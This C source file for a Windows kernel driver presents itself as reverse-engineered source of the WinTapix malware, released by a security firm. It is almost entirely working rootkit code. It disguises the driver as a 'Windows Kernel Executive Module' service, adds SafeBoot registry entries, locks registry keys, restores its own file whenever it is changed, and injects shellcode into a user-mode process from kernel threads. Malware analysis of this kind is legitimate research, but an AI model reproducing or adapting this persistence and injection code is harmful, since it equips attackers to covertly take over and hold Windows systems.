/*
 _   __ _____ _____  _    _ _   _
| | / /|  ___|  _  || |  | | | | |
| |/ / | |__ | | | || |  | | | | |
|    \ |  __|| | | || |/\| | | | |
| |\  \| |___\ \_/ /\  /\  / |_| |
\_| \_/\____/ \___/  \/  \/ \___/
                            2023
Copyright (c) Fluxuss Cyber Tech Desenvolvimento de Software, SLU (FLUXUSS)
Copyright (c) Fluxuss Software Security, LLC

! Reversed Soruce code from the original malware and maybe not equivalent the original source code.
*/

#include "DriverMain.h"

__int64 query_file_information_get_file_size(
    
    _In_ const WCHAR* wchFileName

) {
    
    UNICODE_STRING uniStrStore;
    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock;
    FILE_STANDARD_INFORMATION FileInformation;
    HANDLE hFile;

    RtlInitUnicodeString(
        
        _Out_ &uniStrStore,
        _In_opt_ wchFileName
    
    );

    ObjectAttributes.Length = 48;
    ObjectAttributes.RootDirectory = 0i64;
    ObjectAttributes.Attributes = 576;
    ObjectAttributes.ObjectName = &uniStrStore;
    ObjectAttributes.SecurityDescriptor = 0i64;
    ObjectAttributes.SecurityQualityOfService = 0i64;

    __int64 sizeFile = 0xFFFFFFFFFFFFFFFF;

    if ( NT_SUCCESS( ZwCreateFile(
        
        _Out_ &hFile,
        _In_ 0x80000000,
        _In_ &ObjectAttributes,
        _Out_ &IoStatusBlock,
        _In_opt_ 0i64,
        _In_ 0x80u,
        _In_ 1u,
        _In_ 1u,
        _In_ 0x20u,
        _In_ 0i64,
        _In_ 0
    
    ) ) ) {

        memset(
            
            _Out_ &IoStatusBlock, 
            _In_ 0, 
            _In_ sizeof( IoStatusBlock )
        
        );
        
        if ( NT_SUCCESS( ZwQueryInformationFile( 
            
            _In_ hFile,
            _Out_ &IoStatusBlock, 
            _Out_ &FileInformation,
            _In_ 0x18u,
            _In_ FileStandardInformation
        
        ) ) )
            sizeFile = FileInformation.EndOfFile.QuadPart;
        
        ZwClose(
            
            _In_ hFile
        
        );
    }

    return sizeFile;
}

NTSTATUS wrap_read_file(
    
    _In_ const WCHAR* wchFileName,
    _In_ PVOID* pBuffer,
    _In_ SIZE_T* szBuffer

) {

    UNICODE_STRING uniStrDestination;
    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock;
    LARGE_INTEGER ByteOffset;

    HANDLE hFile;

    *szBuffer = query_file_information_get_file_size(
        
        _In_ wchFileName
    
    );

    if ( *szBuffer == 0xFFFFFFFFFFFFFFFF ) return STATUS_FILE_INVALID;

    *pBuffer = ExAllocatePoolWithTag( 
        
        _In_ NonPagedPool,
        _In_ *szBuffer,
        _In_ 'MAL'
    
    );

    if ( !*pBuffer ) return STATUS_ADDRESS_NOT_ASSOCIATED;

    RtlInitUnicodeString(
        
        _Out_ &uniStrDestination,
        _In_ wchFileName
    
    );

    ObjectAttributes.Length = 48;
    ObjectAttributes.RootDirectory = 0i64;
    ObjectAttributes.Attributes = 576;
    ObjectAttributes.ObjectName = &uniStrDestination;
    ObjectAttributes.SecurityDescriptor = 0i64;
    ObjectAttributes.SecurityQualityOfService = 0i64;

    NTSTATUS status = ZwCreateFile(
        
        _Out_ &hFile,
        _In_ 0x80000000,
        _In_ &ObjectAttributes,
        _Out_ &IoStatusBlock,
        _In_ 0i64,
        _In_ 0x80u,
        _In_ 1u,
        _In_ 1u,
        _In_ 0x20u,
        _In_ 0i64,
        _In_ 0
    
    );

    if ( NT_SUCCESS( status ) ) {
        
        ByteOffset.QuadPart = 0i64;

        return ZwReadFile(
            
            _In_ hFile,
            _In_ 0i64,
            _In_ 0i64,
            _In_ 0i64,
            _Out_ &IoStatusBlock,
            _Out_ *pBuffer,
            _In_ (ULONG)*szBuffer,
            _In_ &ByteOffset,
            _In_ 0i64
        
        );
    }

    return status;
}

NTSTATUS create_kernel_mode_file(
    
    _In_ const WCHAR* wchWintapixPath

) {

    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock;
    UNICODE_STRING uniStrPath;
    HANDLE hFile;

    memset(
        
        _Out_ &IoStatusBlock,
        _In_ 0,
        _In_ sizeof( IoStatusBlock )
    
    );

    RtlInitUnicodeString(
        
        _Out_ &uniStrPath,
        _In_ wchWintapixPath
    
    );
    
    ObjectAttributes.Length = 48;
    ObjectAttributes.RootDirectory = 0i64;
    ObjectAttributes.Attributes = 576;
    ObjectAttributes.ObjectName = &uniStrPath;
    ObjectAttributes.SecurityDescriptor = 0i64;
    ObjectAttributes.SecurityQualityOfService = 0i64;

    return ZwCreateFile(
        
        _Out_ &hFile,
        _In_ 0x10000000u,
        _In_ &ObjectAttributes,
        _Out_ &IoStatusBlock,
        _In_opt_ 0i64,
        _In_ 0x80u,
        _In_ 0,
        _In_ 1u,
        _In_ 0x20u,
        _In_ 0i64,
        _In_ 0
    
    );
}

NTSTATUS wrap_persistence_thread_main(
    
    _In_ const WCHAR* wchWintapixPath,
    _In_ const WCHAR* wchWintapixPath2,
    _In_ const WCHAR* wchWintapixName

) {

    PVOID pBuffer;
    SIZE_T szBuffer;
    UNICODE_STRING uniStrWintaPixPath;
    OBJECT_ATTRIBUTES ObjectAttributes;
    HANDLE hFile, hEvent;
    IO_STATUS_BLOCK IoStatusBlock;

    NtNotifyChangeDirectoryFile = ( _NtNotifyChangeDirectoryFile ) GetFunctionAddress(
        
        _In_ "NtNotifyChangeDirectoryFile"
    
    );

    if ( !MmIsAddressValid( 
        
        _In_ &NtNotifyChangeDirectoryFile
    
    ) ) return STATUS_ADDRESS_NOT_ASSOCIATED;

    NTSTATUS status = wrap_read_file(
        
        _In_ wchWintapixPath,
        _In_ &pBuffer,
        _In_ &szBuffer
    
    );

    if ( NT_SUCCESS( status ) ) {

        create_kernel_mode_file(
            
            _In_ wchWintapixPath
        
        );

        RtlInitUnicodeString(
            
            _Out_ &uniStrWintaPixPath,
            _In_ wchWintapixPath2
        
        );

        ObjectAttributes.Length = 48;
        ObjectAttributes.RootDirectory = 0i64;
        ObjectAttributes.Attributes = 64;
        ObjectAttributes.ObjectName = &uniStrWintaPixPath;
        ObjectAttributes.SecurityDescriptor = 0i64;
        ObjectAttributes.SecurityQualityOfService = 0i64;

        status = ZwCreateFile(
            
            _Out_ &hFile,
            _In_ 0x100001u,
            _In_ &ObjectAttributes,
            _Out_ &IoStatusBlock,
            _In_ 0i64,
            _In_ 0x4000u,
            _In_ 7u,
            _In_ 1u,
            _In_ 0x21u,
            _In_ 0i64,
            _In_ 0
        
        );

        if ( NT_SUCCESS( status ) ) {

            ObjectAttributes.Length = 48;
            
            memset(
                
                _Out_ &ObjectAttributes.RootDirectory,
                _In_ 0,
                _In_ 20
            
            );
            
            ObjectAttributes.SecurityDescriptor = 0i64;
            ObjectAttributes.SecurityQualityOfService = 0i64;

            ZwCreateEvent(
                
                _Out_ &hEvent,
                _In_ 0x1F0003u,
                _In_ &ObjectAttributes,
                _In_ NotificationEvent,
                _In_ 0
            
            );

            ULONG NumberOfBytes = 0x10000i64;

            FILE_NOTIFY_INFORMATION* fInfo = ( FILE_NOTIFY_INFORMATION* ) ExAllocatePoolWithTag( 
                
                _In_ NonPagedPool,
                _In_ 0x10000ui64,
                _In_ 'mall'
            
            );

            while ( TRUE ) {

                if ( NtNotifyChangeDirectoryFile( 
                    
                    _In_ hFile,
                    _In_ hEvent,
                    _In_ NULL,
                    _In_ NULL,
                    _Out_ &IoStatusBlock,
                    _Out_ fInfo,
                    _In_ NumberOfBytes,
                    _In_ 4095,
                    _In_ TRUE
                
                ) == STATUS_PENDING )
                    ZwWaitForSingleObject(
                        
                        _In_ hEvent,
                        _In_ 1u,
                        _In_ 0i64
                    
                    );
                
                ZwSetEvent(
                    
                    _In_ hEvent,
                    _Out_ 0i64
                
                );

                do {

                    DbgPrintEx(
                        
                        _In_ 0,
                        _In_ 0,
                        _In_ "File changed: %ls",
                        fInfo->FileName
                    
                    );

                    if ( compare_unicode_string_2(
                        
                        _In_ wchWintapixName,
                        _In_ fInfo->FileName,
                        _In_ fInfo->FileNameLength
                    
                    ) ) {

                        delete_file(
                            
                            _In_ wchWintapixPath
                        
                        );

                        override_file_with_buffer(
                            
                            _In_ wchWintapixPath,
                            _In_ pBuffer,
                            _In_ (ULONG)szBuffer
                        
                        );
                        
                        create_kernel_mode_file(
                            
                            _In_ wchWintapixPath
                        
                        );

                    }

                    fInfo = ( FILE_NOTIFY_INFORMATION* )( ( char* ) fInfo + fInfo->NextEntryOffset );

                } while ( fInfo->NextEntryOffset );

            }

        }

    }

    return status;
}

void persistence_thread(
    
    _In_ PVOID StartContext

) {

    UNREFERENCED_PARAMETER( StartContext );

    wrap_persistence_thread_main(
        
        _In_ L"\\systemroot\\system32\\drivers\\WinTapix.sys",
        _In_ L"\\systemroot\\system32\\drivers\\",
        _In_ L"WinTapix.sys"
    
    );

}

NTSTATUS notify_registry_key_change(
    
    _In_ const WCHAR* wchWintapixRegisty

) {

    UNICODE_STRING uniStrDest;
    OBJECT_ATTRIBUTES ObjectAttributes;

    RtlInitUnicodeString(
        
        _Out_ &uniStrDest,
        _In_ wchWintapixRegisty
    
    );

    ObjectAttributes.Length = 48;
    ObjectAttributes.RootDirectory = 0i64;
    ObjectAttributes.Attributes = 64;
    ObjectAttributes.ObjectName = &uniStrDest;
    ObjectAttributes.SecurityDescriptor = 0i64;
    ObjectAttributes.SecurityQualityOfService = 0i64;
    
    HANDLE hKey;
    NTSTATUS status = ZwOpenKey(
        
        _Out_ &hKey,
        _In_ 0xF003Fu,
        _In_ &ObjectAttributes
    
    );
    
    if ( !NT_SUCCESS( status ) ) {

        ObjectAttributes.Length = 48;
        ObjectAttributes.RootDirectory = 0i64;
        ObjectAttributes.Attributes = 576;
        ObjectAttributes.ObjectName = &uniStrDest;
        ObjectAttributes.SecurityDescriptor = 0i64;
        ObjectAttributes.SecurityQualityOfService = 0i64;
        
        status = ZwCreateKey(
            
            _Out_ &hKey,
            _In_ 0xF003Fu,
            _In_ &ObjectAttributes,
            _In_ 0,
            _In_ 0i64,
            _In_ 0,
            _Out_ 0i64
        
        );
    }

    if ( NT_SUCCESS( status ) ) return ZwNotifyChangeKey(
        
        _In_ hKey,
        _In_ 0i64,
        _In_ NULL,
        _In_ (PVOID)1,
        _Out_ &g_IoStatusBlock,
        _In_ 5u,
        _In_ 1u,
        _Out_ 0i64,
        _In_ 0,
        _In_ 1u
    
    );

    return status;
}

NTSTATUS Lock_Registy_Key(
    
    _In_ const WCHAR* wchRegistyKey

) {

    UNICODE_STRING uStrRegistyService;
    OBJECT_ATTRIBUTES ObjectAttributes;

    HANDLE hKey;

    NtLockRegistryKey = ( _NtLockRegistryKey )GetFunctionAddress(
        
        _In_ "NtLockRegistryKey"
    
    );

    if ( !MmIsAddressValid(
        
        _In_ &NtLockRegistryKey
    
    ) )
        return STATUS_ADDRESS_NOT_ASSOCIATED;

    RtlInitUnicodeString(
        
        _Out_ &uStrRegistyService,
        _In_ wchRegistyKey
    
    );

    ObjectAttributes.Length = 48;
    ObjectAttributes.RootDirectory = 0i64;
    ObjectAttributes.Attributes = 64;
    ObjectAttributes.ObjectName = &uStrRegistyService;
    ObjectAttributes.SecurityDescriptor = 0i64;
    ObjectAttributes.SecurityQualityOfService = 0i64;

    NTSTATUS status = ZwOpenKey(
        
        _Out_ &hKey,
        _In_ 0x20019u,
        _In_ &ObjectAttributes
    
    );

    if ( NT_SUCCESS( status ) )
        return NtLockRegistryKey(
            
            _In_ hKey
        
        );
    
    return STATUS_UNSUCCESSFUL;
}

NTSTATUS set_registry_key_value_2(
    
    _In_ void* handle, 
    _In_ const WCHAR* key,
    _In_ int value

) {

    UNICODE_STRING uniStrValue;

    RtlInitUnicodeString(
        
        _Out_ &uniStrValue,
        _In_ key
    
    );

    return ZwSetValueKey(
        
        _In_ handle,
        _In_ &uniStrValue,
        _In_ 0,
        _In_ 4,
        _In_ (PVOID)value,
        _In_ 4
    
    );
}

NTSTATUS set_registry_key_value(
    
    _In_ void* handle,
    _In_ const WCHAR* key,
    _In_ void* value

) {

    UNICODE_STRING uniStrKey;
    size_t szLength;

    RtlStringCchLengthW(
        
        _In_ value,
        _In_ 0x7FFFFFFF,
        _Out_ &szLength
    
    );

    RtlInitUnicodeString(
        
        _Out_ &uniStrKey,
        _In_ key
    
    );

    ULONG szValue = ( ULONG )szLength;

    return ZwSetValueKey(
        
        _In_ handle,
        _In_ &uniStrKey,
        _In_ 0,
        _In_ 1,
        _In_ value,
        _In_ 2 * szValue + 2
    
    );
}

NTSTATUS garant_driver_run(
    
    _In_ const WCHAR* wchRegistyKey

) {

    UNICODE_STRING uniStrRegistyKey;
    OBJECT_ATTRIBUTES ObjectAttributes;
    HANDLE hKey;

    RtlInitUnicodeString(
        
        _Out_ &uniStrRegistyKey,
        _In_ wchRegistyKey
    
    );

    ObjectAttributes.Length = 48;
    ObjectAttributes.RootDirectory = 0i64;
    ObjectAttributes.Attributes = 64;
    ObjectAttributes.ObjectName = &uniStrRegistyKey;
    ObjectAttributes.SecurityDescriptor = 0i64;
    ObjectAttributes.SecurityQualityOfService = 0i64;
    
    NTSTATUS status = ZwOpenKey(
        
        _Out_ &hKey,
        _In_ 0xF003Fu,
        _In_ &ObjectAttributes
    
    );

    if ( !NT_SUCCESS( status ) ) {

        //Create a new registy key
        ObjectAttributes.Length = 48;
        ObjectAttributes.RootDirectory = 0i64;
        ObjectAttributes.Attributes = 576;
        ObjectAttributes.ObjectName = &uniStrRegistyKey;
        ObjectAttributes.SecurityDescriptor = 0i64;
        ObjectAttributes.SecurityQualityOfService = 0i64;
        
        status = ZwCreateKey(
            
            _Out_ &hKey,
            _In_ 0xF003Fu,
            _In_ &ObjectAttributes,
            _In_ 0,
            _In_ 0i64,
            _In_ 0,
            _Out_ 0i64
        
        );
    }

    if ( NT_SUCCESS( status ) ) {

        set_registry_key_value(
            
            _In_ hKey,
            _In_ L"DisplayName",
            _In_ L"WinTapix Driver"
        
        );

        set_registry_key_value_2(
            
            _In_ hKey,
            _In_ L"ErrorControl",
            _In_ TRUE
        
        );
        
        set_registry_key_value(
            
            _In_ hKey,
            _In_ L"ImagePath",
            _In_ L"\\SystemRoot\\System32\\drivers\\WinTapix.sys"
        
        );
        
        set_registry_key_value(
            
            _In_ hKey,
            _In_ L"Description",
            _In_ L"Windows Kernel Executive Module."
        
        );
        
        set_registry_key_value_2(
            
            _In_ hKey,
            _In_ L"Start",
            _In_ TRUE
        
        );
        
        set_registry_key_value_2(
            
            _In_ hKey,
            _In_ L"Type",
            _In_ TRUE
        
        );

        return ZwNotifyChangeKey(
            
            _In_ hKey,
            _In_ 0i64,
            _In_ NULL,
            _In_ (PVOID)1,
            _Out_ &g_IoStatusBlock, 
            _In_ 5u,
            _In_ 1u,
            _Out_ 0i64, 
            _In_ 0,
            _In_ 1u
        
        );

    }

    return STATUS_UNSUCCESSFUL;
}

NTSTATUS persistence_stuff_main( 
    
    void

) {

    UNICODE_STRING ustrWintapix;
    UNICODE_STRING ustrSecurityService;
    UNICODE_STRING ustrDriverMinimal;
    UNICODE_STRING ustrWintapixNetworkPersist;

    RtlInitUnicodeString(
        
        _Out_ &ustrWintapix,
        _In_ L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinTapix"
    
    );

    NTSTATUS status = Lock_Registy_Key(
        
        _In_ ustrWintapix.Buffer
    
    );

    if ( NT_SUCCESS( status ) ) {

        garant_driver_run(
            
            _In_ ustrWintapix.Buffer
        
        );

        status = PsCreateSystemThread(
            
            _Out_ &g_hThreadPersist,
            _In_ 0,
            _In_ 0i64,
            _In_ 0i64,
            _Out_opt_ 0i64,
            _In_ (PKSTART_ROUTINE)persistence_thread,
            _In_ 0i64
        
        );

        if ( NT_SUCCESS( status ) ) {

            RtlInitUnicodeString(
                
                _Out_ &ustrSecurityService,
                _In_ L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinTapix\\Security"
            
            );

            Lock_Registy_Key(
                
                _In_ ustrSecurityService.Buffer
            
            );

            RtlInitUnicodeString(
                
                _Out_ &ustrDriverMinimal,
                _In_ L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\WinTapix.sys"
            
            );

            notify_registry_key_change(
                
                _In_ ustrDriverMinimal.Buffer
            
            );

            Lock_Registy_Key(
                
                _In_ ustrDriverMinimal.Buffer
            
            );

            RtlInitUnicodeString(
                
                _Out_ &ustrWintapixNetworkPersist,
                _In_ L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\WinTapix.sys"
            
            );

            notify_registry_key_change(
                
                _In_ ustrWintapixNetworkPersist.Buffer
            
            );

            Lock_Registy_Key(
                
                _In_ ustrWintapixNetworkPersist.Buffer
            
            );

        }

    }

    return status;
}


NTSTATUS SetThreadDelay(
    
    _In_ signed int siDelayTime

) {

    LARGE_INTEGER laInterval = { 0 };

    NTSTATUS ntStatus = STATUS_SUCCESS;

    if ( siDelayTime >= 50000 ) {

        laInterval.QuadPart = -10 * siDelayTime;

        return KeDelayExecutionThread(
            
            _In_ KernelMode,
            _In_ TRUE,
            _In_ &laInterval
        
        ) != 0;

    } else KeStallExecutionProcessor(
        
        _In_ siDelayTime
    
    );

    return ntStatus;
}

void ThreadMalware(
    
    _In_ PVOID StartContext

) {

    UNREFERENCED_PARAMETER( StartContext );

    SIZE_T process_to_inect = (SIZE_T)-1;

    while ( TRUE ) {

        while ( TRUE ) {

            OpenTargetProcess(
                
                _In_ &process_to_inect
            
            );

            DbgPrintEx(
                
                _In_ 0,
                _In_ 0,
                _In_ "PID: %X",
                process_to_inect
            
            );

            if ( process_to_inect != -1 ) break;

            SetThreadDelay( 
            
                _In_ 5000000
            
            );

        }

        if ( NT_SUCCESS( InjectShellcodeOnUsermodeProcess( 
            
            _In_ process_to_inect,
            _In_ GetFunctionAddress(
            
                _In_ "NtWriteVirtualMemory"
            
            ),
            _In_ GetFunctionAddress(
                
                _In_ "ZwCreateThreadEx"
            
            ),
            _In_ g_ucMyShellcode,
            _In_ 3072
        
        ) ) )
            if ( NT_SUCCESS( TerminateUsemodeProcess( 
                
                _In_ process_to_inect
            
            ) ) )
                break;

    }

}

NTSTATUS DriverEntry(
    
    _In_ PDRIVER_OBJECT pDriverObject,
    _In_ PUNICODE_STRING pRegistryPath

) {

    pDriverObject->DriverUnload = UnloadDriver;

    UNREFERENCED_PARAMETER( pDriverObject );

    UNREFERENCED_PARAMETER( pRegistryPath );

    DbgPrintEx(
        
        _In_ 0,
        _In_ 0,
        _In_ "Hello World !!"
    
    );

    persistence_stuff_main( );

    PsCreateSystemThread( 
        
        _Out_ &g_hThread,
        _In_ 0,
        _In_ NULL,
        _In_ NULL,
        _Out_opt_ NULL,
        _In_ &ThreadMalware,
        _In_ NULL
    
    );

    return STATUS_SUCCESS;
}

VOID UnloadDriver(
    
    _In_ PDRIVER_OBJECT pDriverObject

) {

    DbgPrintEx(

        _In_ 0,
        _In_ 0,
        _In_ "GoodBye, Driver Unload !!"
    
    );

    UNREFERENCED_PARAMETER( pDriverObject );

    ZwClose(
        
        _In_ g_hThread
    
    );

    ZwClose(
        
        _In_ g_hThreadPersist
    
    );

}